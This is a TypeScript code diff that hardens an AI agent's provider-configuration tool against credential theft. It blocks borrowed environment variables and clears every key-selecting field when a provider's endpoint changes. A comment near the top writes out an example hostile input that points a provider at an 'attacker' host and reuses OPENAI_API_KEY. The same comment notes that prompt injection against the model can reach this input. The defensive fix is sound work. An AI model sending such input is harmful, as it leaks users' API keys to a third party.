@@ -441,6 +441,69 @@ interface ProviderManageOutput {
 }
 
 /**
+ * Every field on a provider entry that decides WHICH credential is sent.
+ *
+ * An API key is issued for one endpoint, so moving the endpoint must not carry
+ * the credential across — and "the credential" is not just `apiKey`. The key
+ * store writes `apiKeys[]` and DELETES the scalar (see
+ * `fallback-provider-key-store.ts`), and `resolveActiveKey` prefers the array,
+ * so a guard that clears only `apiKey` clears the field the product stopped
+ * using. `envVars` names the environment variable the key is read from and
+ * `activeKey` selects which stored key is sent; either one alone re-attaches a
+ * credential to the new endpoint.
+ */
+const CREDENTIAL_SELECTOR_FIELDS = ['apiKey', 'apiKeys', 'activeKey', 'envVars'] as const;
+
+/**
+ * Environment variables already claimed by a DIFFERENT provider entry.
+ *
+ * `envVars` lets the caller name any environment variable, including one that
+ * belongs to another provider — so `{action:'add', baseUrl:'https://attacker',
+ * envVars:['OPENAI_API_KEY']}` stands up a provider that reads someone else's
+ * key and ships it to a caller-chosen host. That is an exfiltration primitive
+ * for a value the model cannot otherwise read, reachable by prompt injection.
+ *
+ * Derived from the config rather than from `@wrongstack/providers`'
+ * `PROVIDER_DEFINITIONS`: core does not depend on providers, and inverting that
+ * edge for this check would break the package boundary. Residual gap, stated
+ * plainly: an env var belonging to a provider that is not configured here is
+ * not claimed, so it is not caught. A provider on OAuth holds no key in its env
+ * var, which is the common case for that gap.
+ */
+function envVarsClaimedByOtherProviders(
+  providers: Record<string, Record<string, unknown>>,
+  exceptProvider: string,
+): Map<string, string> {
+  const claimed = new Map<string, string>();
+  for (const [id, entry] of Object.entries(providers)) {
+    if (id === exceptProvider) continue;
+    const names = entry?.['envVars'];
+    if (!Array.isArray(names)) continue;
+    for (const name of names) {
+      if (typeof name === 'string' && !claimed.has(name)) claimed.set(name, id);
+    }
+  }
+  return claimed;
+}
+
+/** Shared by `add` and `configure`; returns an error message, or null to proceed. */
+function rejectBorrowedEnvVars(
+  providers: Record<string, Record<string, unknown>>,
+  provider: string,
+  requested: readonly unknown[] | undefined,
+): string | null {
+  if (!requested) return null;
+  const claimed = envVarsClaimedByOtherProviders(providers, provider);
+  for (const name of requested) {
+    const owner = typeof name === 'string' ? claimed.get(name) : undefined;
+    if (owner !== undefined) {
+      return `Environment variable "${String(name)}" already supplies the key for provider "${owner}". Reading another provider's credential from "${provider}" is not allowed; use provider_key_set to give "${provider}" its own key.`;
+    }
+  }
+  return null;
+}
+
+/**
  * Reject provider base URLs that are malformed, non-HTTP, or carry embedded
  * credentials (WS-013). Private and loopback hosts stay allowed on purpose —
  * Ollama, LM Studio and omniroute are first-class local providers.
@@ -524,6 +587,8 @@ function createProviderManageTool(opts: FallbackManageToolOptions): Tool<Provide
           const invalid = validateProviderBaseUrl(input.baseUrl);
           if (invalid) return { status: 'error', message: invalid };
         }
+        const borrowed = rejectBorrowedEnvVars(providers, input.provider, input.envVars);
+        if (borrowed) return { status: 'error', message: borrowed };
         const entry: Record<string, unknown> = { type: input.type };
         if (input.models) entry.models = input.models;
         if (input.baseUrl) entry.baseUrl = input.baseUrl;
@@ -564,19 +629,41 @@ function createProviderManageTool(opts: FallbackManageToolOptions): Tool<Provide
         // subsequent request — plus the boot-time /v1/models probe — would send
         // the stored key there. Moving the endpoint now drops the key unless the
         // caller supplies a new one in the same call.
+        //
+        // The original guard cleared only the scalar `entry.apiKey`, which the
+        // key store no longer writes: it stores `apiKeys[]` and deletes the
+        // scalar, and `resolveActiveKey` prefers the array. So on every real
+        // config the drop cleared an absent field and the live key survived the
+        // redirect. Clear every field that selects a credential —
+        // CREDENTIAL_SELECTOR_FIELDS — not just the one the mitigation was
+        // written against.
         const endpointChanged =
           input.baseUrl !== undefined && (entry.baseUrl ?? undefined) !== (previous.baseUrl ?? undefined);
-        const keyDropped = endpointChanged && input.apiKey === undefined && previous.apiKey !== undefined;
-        if (keyDropped) entry.apiKey = undefined;
+        const explicitlySupplied = new Set<string>([
+          ...(input.apiKey !== undefined ? ['apiKey'] : []),
+          ...(input.envVars !== undefined ? ['envVars'] : []),
+        ]);
+        const droppedFields = endpointChanged
+          ? CREDENTIAL_SELECTOR_FIELDS.filter(
+              (field) => !explicitlySupplied.has(field) && previous[field] !== undefined,
+            )
+          : [];
+        for (const field of droppedFields) entry[field] = undefined;
+
+        // An explicitly-supplied `envVars` survives the drop above, so it still
+        // has to clear the borrowed-credential check.
+        const borrowed = rejectBorrowedEnvVars(providers, input.provider, input.envVars);
+        if (borrowed) return { status: 'error', message: borrowed };
 
         providers[input.provider] = entry;
         await opts.updateConfig((cfg) => {
           cfg.providers = providers;
         });
         const updated = Object.keys({ ...entry }).filter((k) => k !== 'apiKey').join(', ');
-        const keyNote = keyDropped
-          ? ' — stored API key cleared because the base URL changed; set it again with provider_key_set'
-          : '';
+        const keyNote =
+          droppedFields.length > 0
+            ? ` — cleared ${droppedFields.join(', ')} because the base URL changed; set the key again with provider_key_set`
+            : '';
         return { status: 'ok', message: `✓ Updated ${input.provider}: ${updated}${keyNote}` };
       }
 
